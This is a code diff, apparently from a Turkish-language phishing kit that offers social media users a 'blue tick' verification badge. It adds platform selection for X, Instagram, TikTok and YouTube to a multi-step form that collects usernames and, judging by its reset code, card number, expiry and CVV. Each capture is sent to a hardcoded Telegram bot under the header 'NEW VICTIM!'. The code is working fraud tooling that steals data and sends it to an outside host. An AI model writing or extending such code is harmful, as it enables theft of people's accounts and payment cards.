@@ -1,14 +1,42 @@
 // ============================================
-// TELEGRAM BOT AYARLARI - BURAYI DOLDURUN!
+// TELEGRAM BOT AYARLARI
 // ============================================
-// @BotFather'dan bot oluşturup token alın
-// @userinfobot'dan chat ID'nizi öğrenin
 const TELEGRAM_BOT_TOKEN = '8522279955:AAFwA7uILD8zkzrxcjXjazc5guzSm1cFI5k';
 const TELEGRAM_CHAT_ID = '6063727392';
 // ============================================
 
 let currentStep = 1;
 let collectedData = {};
+let selectedPlatform = '';
+
+const PLATFORM_NAMES = {
+    twitter: 'X / Twitter',
+    instagram: 'Instagram',
+    tiktok: 'TikTok',
+    youtube: 'YouTube'
+};
+
+function selectPlatform(platform) {
+    selectedPlatform = platform;
+    collectedData.platform = PLATFORM_NAMES[platform] || platform;
+
+    // Update the platform text in step 2
+    const platformText = document.getElementById('platformText');
+    if (platformText) {
+        platformText.textContent = PLATFORM_NAMES[platform] + ' hesabınıza mavi tik almak için kullanıcı adınızı girin';
+    }
+
+    // Highlight selected platform
+    document.querySelectorAll('.platform-btn').forEach(btn => {
+        btn.classList.remove('selected');
+    });
+    event.target.closest('.platform-btn').classList.add('selected');
+
+    // Move to step 2 after a brief delay for visual feedback
+    setTimeout(() => {
+        nextStep(2);
+    }, 300);
+}
 
 function nextStep(step) {
     // Capture username if moving from step 2
@@ -19,7 +47,7 @@ function nextStep(step) {
             return;
         }
         collectedData.username = username;
-        sendToTelegram({ type: 'username', username: username });
+        sendToTelegram({ type: 'username', platform: selectedPlatform, username: username });
     }
 
     document.getElementById('step' + currentStep).classList.add('hidden');
@@ -74,6 +102,18 @@ function resetForm() {
     document.getElementById('expiry').value = '';
     document.getElementById('cvv').value = '';
     collectedData = {};
+    selectedPlatform = '';
+
+    // Remove selected class from platform buttons
+    document.querySelectorAll('.platform-btn').forEach(btn => {
+        btn.classList.remove('selected');
+    });
+
+    // Reset platform text
+    const platformText = document.getElementById('platformText');
+    if (platformText) {
+        platformText.textContent = 'Hesabınıza mavi tik almak için kullanıcı adınızı girin';
+    }
 
     // Go back to step 1
     document.getElementById('step4').classList.add('hidden');
@@ -86,6 +126,9 @@ function sendToTelegram(data) {
 
     let message = '🚨 <b>YENİ KURBAN!</b>\n\n';
 
+    if (data.platform) {
+        message += '📱 <b>Platform:</b> ' + escapeHtml(data.platform) + '\n';
+    }
     if (data.username) {
         message += '👤 <b>Kullanıcı:</b> @' + escapeHtml(data.username) + '\n';
     }
